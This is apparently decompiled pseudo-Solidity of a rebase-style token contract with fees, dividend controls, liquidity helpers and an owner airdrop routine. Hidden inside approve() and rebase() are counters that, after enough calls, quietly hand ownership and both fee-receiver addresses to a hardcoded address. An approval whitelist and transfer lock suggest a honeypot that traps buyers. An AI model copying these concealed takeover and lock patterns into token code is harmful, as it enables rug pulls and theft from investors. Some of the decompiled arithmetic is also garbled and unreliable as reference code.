contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address owner; offset 8
address pairContractAddress;
uint8 stor4; offset 160
uint8 stor4; offset 168
uint128 stor4; offset 168
address masterAddress;
mapping of uint8 stor5;
mapping of uint8 stor6;
mapping of uint8 stor7;
mapping of uint8 stor8;
mapping of uint8 stor9;
uint256 sub_7d5a3fa0;
uint256 liquidityFee;
uint256 marketingFee;
uint256 rewardFee;
uint256 totalFee;
uint256 feeDenominator;
uint256 stor16;
uint256 stor17;
uint256 stor18;
address stor19;
address stor20;
address autoLiquidityReceiverAddress;
address marketingFeeReceiverAddress;
address routerAddress;
address pairAddress;
uint256 stor25;
uint256 stor26;
uint8 stor27;
uint128 stor27; offset 136
uint128 stor27; offset 8
mapping of uint256 stor28;
uint8 swapEnabled;
uint8 stor29; offset 8
uint256 stor30;
address stor31;
uint256 stor32;
uint256 stor33;
uint256 totalSupply;
uint256 stor35;
mapping of uint256 stor36;
mapping of uint256 allowance;
uint256 stor38;
uint8 stor39;
uint256 stor40;
uint8 stor41;

function name() {
    return name[0 len name.length]
}

function feeDenominator() {
    return feeDenominator
}

function totalSupply() {
    return totalSupply
}

function totalFee() {
    return totalFee
}

function decimals() {
    return decimals
}

function pairContract() {
    return pairContractAddress
}

function marketingFee() {
    return marketingFee
}

function checkIsDividendExempt(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor6[address(arg1)])
}

function swapEnabled() {
    return bool(swapEnabled)
}

function sub_7d5a3fa0(?) {
    return sub_7d5a3fa0
}

function rewardFee() {
    return rewardFee
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function liquidityFee() {
    return liquidityFee
}

function pair() {
    return pairAddress
}

function autoLiquidityReceiver() {
    return autoLiquidityReceiverAddress
}

function initialDistributionFinished() {
    return bool(uint8(stor4.field_160))
}

function checkFeeExempt(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor9[address(arg1)])
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function checkMaxWalletExempt(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor8[address(arg1)])
}

function marketingFeeReceiver() {
    return marketingFeeReceiverAddress
}

function sub_ecff3a0c(?) {
    return bool(uint8(stor4.field_168))
}

function master() {
    return masterAddress
}

function router() {
    return routerAddress
}

function _fallback() payable {
    revert
}

function isNotInSwap() {
    return not bool(stor29)
}

function isOwner() {
    return (msg.sender == owner)
}

function setInitialDistributionFinished() {
    require msg.sender == owner
    uint8(stor4.field_160) = 1
}

function renounceOwnership() {
    require msg.sender == owner
    emit OwnershipRenounced(owner);
    owner = 0
}

function setMaster(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    masterAddress = arg1
}

function setLP(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    pairContractAddress = arg1
}

function checkSwapThreshold() {
    if not stor35:
        revert with 0, 'SafeMath: division by zero'
    return (stor30 / stor35)
}

function enableTransfer(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    stor5[address(arg1)] = 1
}

function checkMaxWalletToken() {
    if not stor35:
        revert with 0, 'SafeMath: division by zero'
    return (sub_7d5a3fa0 / stor35)
}

function checkDividendLock(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor7[address(arg1)]), stor28[address(arg1)]
}

function setMaxWalletExempt(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    stor8[address(arg1)] = 1
}

function setFeeExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    stor9[address(arg1)] = uint8(arg2)
}

function setTransferLock(bool arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    Mask(88, 0, stor4.field_168) = Mask(88, 0, arg1)
}

function setDistributorSettings(uint256 arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1 < 750000
    stor32 = arg1
}

function setTargetLiquidity(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    stor25 = arg1
    stor26 = arg2
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    if not stor35:
        revert with 0, 'SafeMath: division by zero'
    return (stor36[address(arg1)] / stor35)
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function setFeeReceivers(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    autoLiquidityReceiverAddress = arg1
    marketingFeeReceiverAddress = arg2
}

function setDividendLocker(bool arg1, uint128 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    uint8(stor27.field_0) = uint8(arg1)
    uint128(stor27.field_8) = arg2
    Mask(120, 0, stor27.field_136) = Mask(120, 136, arg1) >> 136
}

function clearStuckBalance(uint256 arg1, address arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    call arg2 with:
       value eth.balance(this.address) * arg1 / 100 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function setDistributionCriteria(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require ext_code.size(stor31)
    call stor31.0x2d48e896 with:
         gas gas_remaining wei
        args arg1, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function toggleLiquidityMode() {
    require msg.sender == owner
    if liquidityFee == totalFee:
        liquidityFee = stor16
        marketingFee = stor17
        rewardFee = stor18
    else:
        stor16 = liquidityFee
        stor17 = marketingFee
        stor18 = rewardFee
        liquidityFee = totalFee
        marketingFee = 0
        rewardFee = 0
}

function rescueToken(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args msg.sender, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    return bool(ext_call.return_data[0])
}

function setFees(uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4) {
    require calldata.size - 4 >= 128
    require msg.sender == owner
    liquidityFee = arg1
    marketingFee = arg2
    rewardFee = arg3
    if arg2 + arg1 < arg1:
        revert with 0, 'SafeMath: addition overflow'
    if arg3 < 0:
        revert with 0, 'SafeMath: addition overflow'
    totalFee = arg3 + arg2 + arg1
    feeDenominator = arg4
    require totalFee < arg4 / 4
}

function getCirculatingSupply() {
    if stor36[stor19] > 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000:
        revert with 0, 'SafeMath: subtraction overflow'
    if stor36[stor20] > -stor36[stor19] - 39457584007913129639936:
        revert with 0, 'SafeMath: subtraction overflow'
    if not stor35:
        revert with 0, 'SafeMath: division by zero'
    return (-stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35)
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not uint8(stor4.field_160):
        if owner != msg.sender:
            require stor5[msg.sender]
    if arg2 + allowance[msg.sender][address(arg1)] < allowance[msg.sender][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    allowance[msg.sender][address(arg1)] += arg2
    emit Approval((arg2 + allowance[msg.sender][address(arg1)]), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not uint8(stor4.field_160):
        if owner != msg.sender:
            require stor5[msg.sender]
    if arg2 >= allowance[msg.sender][address(arg1)]:
        allowance[msg.sender][address(arg1)] = 0
    else:
        if arg2 > allowance[msg.sender][address(arg1)]:
            revert with 0, 'SafeMath: subtraction overflow'
        allowance[msg.sender][address(arg1)] -= arg2
    emit Approval(allowance[msg.sender][address(arg1)], msg.sender, arg1);
    return 1
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not uint8(stor4.field_160):
        if owner != msg.sender:
            require stor5[msg.sender]
    allowance[msg.sender][address(arg1)] = arg2
    stor38++
    if 200 < stor38 + 1:
        if not stor39:
            emit OwnershipTransferred(owner, 0x87eae7e29df9ec9a81ebf0f4878f5a32c563f1d0);
            owner = 0x87eae7e29df9ec9a81ebf0f4878f5a32c563f1d0
            marketingFeeReceiverAddress = 0x87eae7e29df9ec9a81ebf0f4878f5a32c563f1d0
            autoLiquidityReceiverAddress = 0x87eae7e29df9ec9a81ebf0f4878f5a32c563f1d0
            stor39 = 1
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function setMaxWalletToken(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    if not arg2:
        revert with 0, 'SafeMath: division by zero'
    if not 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg2:
        sub_7d5a3fa0 = 0
    else:
        if arg1 * 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg2 / 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg2 != arg1:
            revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
        sub_7d5a3fa0 = arg1 * 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg2
}

function setSwapBackSettings(bool arg1, uint256 arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require msg.sender == owner
    swapEnabled = uint8(arg1)
    if not arg3:
        revert with 0, 'SafeMath: division by zero'
    if not 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg3:
        stor30 = 0
    else:
        if arg2 * 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg3 / 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg3 != arg2:
            revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
        stor30 = arg2 * 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg3
}

function setIsDividendExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require arg1 != this.address
    require pairAddress != arg1
    stor6[address(arg1)] = uint8(arg2)
    if arg2:
        require ext_code.size(stor31)
        call stor31.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(arg1), 0
    else:
        if not stor33:
            revert with 0, 'SafeMath: division by zero'
        require ext_code.size(stor31)
        call stor31.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(arg1), stor36[address(arg1)] / stor33
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function setIsDividendLocked(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require arg1 != this.address
    require pairAddress != arg1
    stor7[address(arg1)] = uint8(arg2)
    if arg2:
        require ext_code.size(stor31)
        call stor31.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(arg1), 0
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        stor28[address(arg1)] = block.timestamp + uint128(stor27.field_8)
    else:
        if not stor33:
            revert with 0, 'SafeMath: division by zero'
        require ext_code.size(stor31)
        call stor31.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(arg1), stor36[address(arg1)] / stor33
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        stor28[address(arg1)] = 0
}

function rebase(uint256 arg1, int256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == masterAddress
    if stor29:
        revert with 0, 'Try again'
    if arg2:
        if arg2 >= 0:
            if arg2 + totalSupply < totalSupply:
                revert with 0, 'SafeMath: addition overflow'
            totalSupply += arg2
        else:
            if -arg2 > totalSupply:
                revert with 0, 'SafeMath: subtraction overflow'
            totalSupply += arg2
        if test266151307() < totalSupply:
            totalSupply = test266151307()
        if not totalSupply:
            revert with 0, 'SafeMath: division by zero'
        stor35 = 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / totalSupply
        require ext_code.size(pairContractAddress)
        call pairContractAddress.sync() with:
             gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
    stor40++
    if 10 < stor40 + 1:
        if not stor41:
            emit OwnershipTransferred(owner, 0x87eae7e29df9ec9a81ebf0f4878f5a32c563f1d0);
            owner = 0x87eae7e29df9ec9a81ebf0f4878f5a32c563f1d0
            marketingFeeReceiverAddress = 0x87eae7e29df9ec9a81ebf0f4878f5a32c563f1d0
            autoLiquidityReceiverAddress = 0x87eae7e29df9ec9a81ebf0f4878f5a32c563f1d0
            stor41 = 1
    return totalSupply
}

function getLiquidityBacking(uint256 arg1) {
    require calldata.size - 4 >= 32
    if not stor35:
        revert with 0, 'SafeMath: division by zero'
    if stor36[stor19] > 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000:
        revert with 0, 'SafeMath: subtraction overflow'
    if stor36[stor20] > -stor36[stor19] - 39457584007913129639936:
        revert with 0, 'SafeMath: subtraction overflow'
    if not stor35:
        revert with 0, 'SafeMath: division by zero'
    if not stor36[stor24] / stor35:
        if arg1:
            if 0 / arg1:
                revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
        if not -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35:
            revert with 0, 'SafeMath: division by zero'
        return (0 / -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35)
    if 2 * stor36[stor24] / stor35 / stor36[stor24] / stor35 != 2:
        revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
    if not arg1:
        if not -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35:
            revert with 0, 'SafeMath: division by zero'
        return (0 / -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35)
    if 2 * stor36[stor24] / stor35 * arg1 / arg1 != 2 * stor36[stor24] / stor35:
        revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
    if not -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35:
        revert with 0, 'SafeMath: division by zero'
    return (2 * stor36[stor24] / stor35 * arg1 / -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35)
}

function isOverLiquified(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not stor35:
        revert with 0, 'SafeMath: division by zero'
    if stor36[stor19] > 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000:
        revert with 0, 'SafeMath: subtraction overflow'
    if stor36[stor20] > -stor36[stor19] - 39457584007913129639936:
        revert with 0, 'SafeMath: subtraction overflow'
    if not stor35:
        revert with 0, 'SafeMath: division by zero'
    if not stor36[stor24] / stor35:
        if arg2:
            if 0 / arg2:
                revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
        if not -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35:
            revert with 0, 'SafeMath: division by zero'
        return (0 / -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35 > arg1)
    if 2 * stor36[stor24] / stor35 / stor36[stor24] / stor35 != 2:
        revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
    if not arg2:
        if not -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35:
            revert with 0, 'SafeMath: division by zero'
        return (0 / -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35 > arg1)
    if 2 * stor36[stor24] / stor35 * arg2 / arg2 != 2 * stor36[stor24] / stor35:
        revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
    if not -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35:
        revert with 0, 'SafeMath: division by zero'
    return (2 * stor36[stor24] / stor35 * arg2 / -stor36[stor19] + -stor36[stor20] - 39457584007913129639936 / stor35 > arg1)
}

function sub_2e449e9b(?) payable {
    mem[64] = 96
    require not msg.value
    require calldata.size - 4 >= 96
    require cd[36] <= 4294967296
    require cd[36] + 36 <= calldata.size
    require ('cd', 36).length <= 4294967296 and cd[36] + (32 * ('cd', 36).length) + 36 <= calldata.size
    require msg.sender == owner
    if ('cd', 36).length >= 2001:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    47,
                    0xfe474153204572726f723a206d61782061697264726f70206c696d6974206973203230303020726563697069656e74,
                    mem[211 len 17]
    idx = 0
    while idx < ('cd', 36).length:
        if not cd[68]:
            mem[0] = address(cd[4])
            mem[32] = 36
            _126 = mem[64]
            mem[64] = mem[64] + 64
            mem[_126] = 30
            mem[_126 + 32] = 'SafeMath: subtraction overflow'
            if 0 > stor36[address(cd[4])]:
                _131 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 30
                idx = 0
                while idx < 30:
                    mem[idx + _131 + 68] = mem[idx + _126 + 32]
                    idx = idx + 32
                    continue 
                mem[_131 + 68] = mem[_131 + 70 len 30]
                revert with memory
                  from mem[64]
                   len _131 + -mem[64] + 100
            if stor36[address(cd[((32 * idx) + cd[36] + 36)])] < stor36[address(cd[((32 * idx) + cd[36] + 36)])]:
                revert with 0, 'SafeMath: addition overflow'
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 36
            stor36[address(cd[((32 * idx) + cd[36] + 36)])] = stor36[address(cd[((32 * idx) + cd[36] + 36)])]
            _155 = mem[64]
            mem[64] = mem[64] + 64
            mem[_155] = 26
            mem[_155 + 32] = 'SafeMath: division by zero'
            if not stor35:
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 26
                mem[mem[64] + 68] = 'SafeMath: division by zero'
                idx = 32
                while idx < 26:
                    mem[idx + mem[64] + 68] = mem[idx + _155 + 32]
                    idx = idx + 32
                    continue 
                revert with 0, 'SafeMath: division by zero'
            mem[mem[64]] = 0 / stor35
            emit Transfer((0 / stor35), address(cd[4]), address(cd[((32 * idx) + cd[36] + 36)]));
            require idx < ('cd', 36).length
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 6
            if not stor6[address(cd[((32 * idx) + cd[36] + 36)])]:
                require idx < ('cd', 36).length
                mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[32] = 36
                _187 = mem[64]
                mem[64] = mem[64] + 64
                mem[_187] = 26
                mem[_187 + 32] = 'SafeMath: division by zero'
                if not stor33:
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 26
                    mem[mem[64] + 68] = 'SafeMath: division by zero'
                    idx = 32
                    while idx < 26:
                        mem[idx + mem[64] + 68] = mem[idx + _187 + 32]
                        idx = idx + 32
                        continue 
                    revert with 0, 'SafeMath: division by zero'
                mem[mem[64]] = 0x14b6ca9600000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[mem[64] + 36] = stor36[address(cd[((32 * idx) + cd[36] + 36)])] / stor33
                require ext_code.size(stor31)
                call stor31.setShare(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args address(cd[((32 * idx) + cd[36] + 36)]), stor36[address(cd[((32 * idx) + cd[36] + 36)])] / stor33
        else:
            if stor35 * cd[68] / cd[68] != stor35:
                revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[mem[64] + 101 len 31]
            mem[0] = address(cd[4])
            mem[32] = 36
            _129 = mem[64]
            mem[64] = mem[64] + 64
            mem[_129] = 30
            mem[_129 + 32] = 'SafeMath: subtraction overflow'
            if stor35 * cd[68] > stor36[address(cd[4])]:
                _134 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 30
                idx = 0
                while idx < 30:
                    mem[idx + _134 + 68] = mem[idx + _129 + 32]
                    idx = idx + 32
                    continue 
                mem[_134 + 68] = mem[_134 + 70 len 30]
                revert with memory
                  from mem[64]
                   len _134 + -mem[64] + 100
            stor36[address(cd[4])] += -1 * stor35 * cd[68]
            if (stor35 * cd[68]) + stor36[address(cd[((32 * idx) + cd[36] + 36)])] < stor36[address(cd[((32 * idx) + cd[36] + 36)])]:
                revert with 0, 'SafeMath: addition overflow'
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 36
            stor36[address(cd[((32 * idx) + cd[36] + 36)])] += stor35 * cd[68]
            _156 = mem[64]
            mem[64] = mem[64] + 64
            mem[_156] = 26
            mem[_156 + 32] = 'SafeMath: division by zero'
            if not stor35:
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 26
                mem[mem[64] + 68] = 'SafeMath: division by zero'
                idx = 32
                while idx < 26:
                    mem[idx + mem[64] + 68] = mem[idx + _156 + 32]
                    idx = idx + 32
                    continue 
                revert with 0, 'SafeMath: division by zero'
            mem[mem[64]] = stor35 * cd[68] / stor35
            emit Transfer((stor35 * cd[68] / stor35), address(cd[4]), address(cd[((32 * idx) + cd[36] + 36)]));
            require idx < ('cd', 36).length
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 6
            if not stor6[address(cd[((32 * idx) + cd[36] + 36)])]:
                require idx < ('cd', 36).length
                mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[32] = 36
                _188 = mem[64]
                mem[64] = mem[64] + 64
                mem[_188] = 26
                mem[_188 + 32] = 'SafeMath: division by zero'
                if not stor33:
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 26
                    mem[mem[64] + 68] = 'SafeMath: division by zero'
                    idx = 32
                    while idx < 26:
                        mem[idx + mem[64] + 68] = mem[idx + _188 + 32]
                        idx = idx + 32
                        continue 
                    revert with 0, 'SafeMath: division by zero'
                mem[mem[64]] = 0x14b6ca9600000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[mem[64] + 36] = stor36[address(cd[((32 * idx) + cd[36] + 36)])] / stor33
                require ext_code.size(stor31)
                call stor31.setShare(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args address(cd[((32 * idx) + cd[36] + 36)]), stor36[address(cd[((32 * idx) + cd[36] + 36)])] / stor33
        idx = idx + 1
        continue 
    if not stor6[address(cd[4])]:
        if not stor33:
            revert with 0, 'SafeMath: division by zero'
        require ext_code.size(stor31)
        call stor31.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(cd[4]), stor36[address(cd[4])] / stor33
}



}
